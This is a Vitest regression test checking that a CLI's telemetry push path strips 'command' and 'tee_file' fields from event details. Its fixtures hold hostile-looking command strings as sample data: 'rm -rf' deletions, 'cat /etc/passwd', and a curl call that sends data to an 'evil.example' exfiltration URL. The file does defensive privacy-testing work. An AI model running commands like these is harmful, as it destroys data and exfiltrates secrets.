/**
 * Regression guard: `command` and `tee_file` must never leave the machine on
 * the push path — whether the allowlist (WIRE_DETAIL_KEYS introspection) path
 * runs or the denylist fallback (sanitizeDetail) runs.
 *
 * This file adds the gap NOT covered by ingest-wire-conformance.test.ts:
 *  - Explicit per-key assertions on the allowlist path for compression / file_read / token_flow.
 *  - Direct sanitizeDetail assertions for the fallback path (C2 risk).
 *  - A loop over every PROJECTED_TYPES member proving no `command` survives projection.
 */

import { randomUUID } from "node:crypto";
import { describe, expect, it } from "vitest";
import { sanitizeDetail } from "../cloud/drainers/envelope.js";
import {
  PROJECTED_TYPES,
  projectRowForWire,
} from "../cloud/drainers/ingest.js";

const REPO_ROOT = "/Users/x/IdeaProjects/unerr-cli";

function baseEvent(type: string): Record<string, unknown> {
  return {
    type,
    schema_version: "1-0-11",
    event_id: randomUUID(),
    ts: new Date().toISOString(),
    source: "unerr-cli@test",
    session_id: "s1",
  };
}

describe("command-strip-guard", () => {
  // -------------------------------------------------------------------------
  // 1. Allowlist path — compression
  // -------------------------------------------------------------------------
  describe("allowlist path: compression", () => {
    it("strips command and tee_file from compression detail", () => {
      const row = {
        ...baseEvent("compression"),
        detail: {
          category: "shell_output",
          raw_bytes: 9000,
          compressed_bytes: 2000,
          saved_pct: 78,
          mechanism: "diff",
          // firewall-forbidden keys
          command: "rm -rf /home/x && echo done",
          tee_file: "/home/x/.unerr/tee/secret.txt",
        },
      };

      const projected = projectRowForWire(row, REPO_ROOT);
      expect(projected).not.toBeNull();

      const detail = (projected as Record<string, unknown>)
        .detail as Record<string, unknown>;

      expect(detail.command).toBeUndefined();
      expect(detail.tee_file).toBeUndefined();
      // benign contract key must survive
      expect(detail.saved_pct).toBe(78);
      expect(detail.category).toBe("shell_output");
    });
  });

  // -------------------------------------------------------------------------
  // 1. Allowlist path — file_read
  // -------------------------------------------------------------------------
  describe("allowlist path: file_read", () => {
    it("strips command and tee_file from file_read detail", () => {
      const row = {
        ...baseEvent("file_read"),
        detail: {
          mode: "explore",
          total_lines: 100,
          returned_lines: 40,
          saved_pct: 60,
          token_estimate: 300,
          file: `${REPO_ROOT}/src/a.ts`,
          entity: "QueryRouter.dispatch",
          // firewall-forbidden keys
          command: "cat /etc/passwd",
          tee_file: "/tmp/leaked.txt",
        },
      };

      const projected = projectRowForWire(row, REPO_ROOT);
      expect(projected).not.toBeNull();

      const detail = (projected as Record<string, unknown>)
        .detail as Record<string, unknown>;

      expect(detail.command).toBeUndefined();
      expect(detail.tee_file).toBeUndefined();
      // contract key survives
      expect(detail.mode).toBe("explore");
      expect(detail.saved_pct).toBe(60);
    });
  });

  // -------------------------------------------------------------------------
  // 1. Allowlist path — token_flow
  // -------------------------------------------------------------------------
  describe("allowlist path: token_flow", () => {
    it("strips command and tee_file from token_flow detail", () => {
      const row = {
        ...baseEvent("token_flow"),
        detail: {
          mechanism: "cache",
          tool: "file_read",
          tokens_saved: 120,
          tokens_without: 200,
          tokens_with: 80,
          // firewall-forbidden keys
          command: "SECRET_KEY=abc pnpm run build",
          tee_file: "/home/x/.unerr/tee/flow.txt",
        },
      };

      const projected = projectRowForWire(row, REPO_ROOT);
      expect(projected).not.toBeNull();

      const detail = (projected as Record<string, unknown>)
        .detail as Record<string, unknown>;

      expect(detail.command).toBeUndefined();
      expect(detail.tee_file).toBeUndefined();
      // benign contract keys survive
      expect(detail.mechanism).toBe("cache");
      expect(detail.tokens_saved).toBe(120);
    });
  });

  // -------------------------------------------------------------------------
  // 2. Fallback path (denylist) — sanitizeDetail directly
  //    This is the C2 risk: if WIRE_DETAIL_KEYS introspection misses a type,
  //    the code falls back to sanitizeRowForPush → sanitizeDetail. This test
  //    proves the denylist catches command/tee_file even on that path.
  // -------------------------------------------------------------------------
  describe("fallback path: sanitizeDetail denylist", () => {
    it("drops command and tee_file but keeps benign saved_pct", () => {
      const result = sanitizeDetail({
        command: "rm -rf /x",
        tee_file: "/abs/x",
        saved_pct: 80,
      });

      expect(result.command).toBeUndefined();
      expect(result.tee_file).toBeUndefined();
      expect(result.saved_pct).toBe(80);
    });

    it("drops command regardless of value type", () => {
      const result = sanitizeDetail({
        command: "curl http://evil.example/exfil?data=secret",
        other_num: 42,
      });

      expect(result.command).toBeUndefined();
      expect(result.other_num).toBe(42);
    });

    it("drops tee_file regardless of nesting depth", () => {
      // tee_file at top level — the denylist is flat-key matched
      const result = sanitizeDetail({
        tee_file: "/Users/x/.unerr/tee/out.txt",
        category: "shell_output",
      });

      expect(result.tee_file).toBeUndefined();
      expect(result.category).toBe("shell_output");
    });
  });

  // -------------------------------------------------------------------------
  // 3. All PROJECTED_TYPES strip command regardless of allowlist vs fallback
  //    Adds a detail that ALSO carries the benign contract field for the type
  //    so the row is realistic (not just noise).
  // -------------------------------------------------------------------------
  describe("every PROJECTED_TYPES member strips command", () => {
    const BENIGN_DETAIL: Record<string, Record<string, unknown>> = {
      compression: {
        category: "shell_output",
        raw_bytes: 1000,
        compressed_bytes: 200,
        saved_pct: 80,
        mechanism: "diff",
      },
      file_read: {
        mode: "explore",
        total_lines: 50,
        returned_lines: 50,
        saved_pct: 0,
        token_estimate: 100,
      },
      token_flow: {
        mechanism: "cache",
        tool: "search_code",
        tokens_saved: 50,
        tokens_without: 100,
        tokens_with: 50,
      },
      behavior: {
        kind: "edit",
        tool: "file_edit",
        response_bytes: 200,
      },
      session_summary: {
        // "history" variant — must NOT set kind:"summary" (that returns null)
        kind: "history",
        duration_ms: 500,
        tool_calls: 3,
        tokens_saved: 20,
        tokens_processed: 80,
        efficiency: 0.25,
        model_id: "claude-sonnet-4-6",
        started_at: "2026-06-25T00:00:00Z",
        ended_at: "2026-06-25T00:05:00Z",
        entity_count: 2,
        session_name: "test",
      },
    };

    for (const type of PROJECTED_TYPES) {
      it(`strips command from ${type} row`, () => {
        const benign = BENIGN_DETAIL[type] ?? {};
        const row = {
          ...baseEvent(type),
          detail: {
            ...benign,
            command: `SECRET_CMD for ${type}`,
            tee_file: `/tmp/${type}-tee.txt`,
          },
        };

        const projected = projectRowForWire(row, REPO_ROOT);
        // session_summary with kind:"history" must not return null
        expect(projected).not.toBeNull();

        const detail = (projected as Record<string, unknown>)
          .detail as Record<string, unknown>;

        expect(
          detail.command,
          `command must be absent from projected ${type} detail`
        ).toBeUndefined();
        expect(
          detail.tee_file,
          `tee_file must be absent from projected ${type} detail`
        ).toBeUndefined();
      });
    }
  });
});
